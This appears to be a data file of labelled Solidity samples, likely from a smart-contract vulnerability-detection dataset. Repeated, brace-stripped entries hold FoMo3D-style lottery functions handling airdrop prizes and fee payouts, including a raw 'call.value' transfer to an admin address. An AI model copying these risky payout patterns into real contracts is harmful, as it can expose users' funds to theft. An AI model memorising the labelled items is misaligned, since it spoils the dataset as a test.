_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
772 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
773 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
774 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
775 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
776 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
